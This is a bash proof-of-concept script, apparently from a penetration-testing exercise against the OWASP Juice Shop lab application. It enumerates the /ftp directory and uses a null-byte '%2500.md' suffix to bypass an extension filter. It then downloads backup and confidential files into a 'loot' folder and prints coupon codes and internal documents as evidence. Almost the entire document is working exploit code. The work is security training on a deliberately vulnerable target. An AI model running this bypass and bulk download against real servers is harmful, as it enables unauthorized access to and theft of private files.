#!/usr/bin/env bash
# PoC 1: Sensitive Data Exposure via /ftp directory listing + file-type filter bypass
# Target: OWASP Juice Shop (lab) http://host.docker.internal:3000
#
# The /ftp endpoint serves a browsable directory containing internal documents and
# backup artifacts. A naive extension filter blocks non .md/.pdf files, but appending
# a NULL byte + .md ("%2500.md") to the name bypasses it and returns the real file.
set -u
B="${1:-http://host.docker.internal:3000}"
OUT="$(dirname "$0")/loot"
mkdir -p "$OUT"

echo "[*] Enumerating directory listing at $B/ftp/"
curl -s "$B/ftp/" | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"//' | grep -v '^\.$' | sort -u

echo
echo "[*] Direct access to a .bak file (blocked by extension filter):"
curl -s -o /dev/null -w "    GET /ftp/package.json.bak -> HTTP %{http_code}\n" "$B/ftp/package.json.bak"

echo "[*] Same file with NULL-byte + .md suffix (filter bypass):"
curl -s -o /dev/null -w "    GET /ftp/package.json.bak%2500.md -> HTTP %{http_code}\n" "$B/ftp/package.json.bak%2500.md"

for f in package.json.bak coupons_2013.md.bak suspicious_errors.yml acquisitions.md announcement_encrypted.md legal.md; do
  curl -s "$B/ftp/$f%2500.md" -o "$OUT/$f"
  printf "    [+] downloaded %-28s (%s bytes)\n" "$f" "$(wc -c < "$OUT/$f")"
done

echo
echo "[*] Evidence - confidential acquisitions document:"
sed -n '1,6p' "$OUT/acquisitions.md"
echo
echo "[*] Evidence - leaked dependency/version manifest:"
grep -E '"(name|version)"' "$OUT/package.json.bak" | head -3
echo
echo "[*] Coupon codes recoverable from coupons_2013.md.bak (first 3 lines):"
sed -n '1,3p' "$OUT/coupons_2013.md.bak"
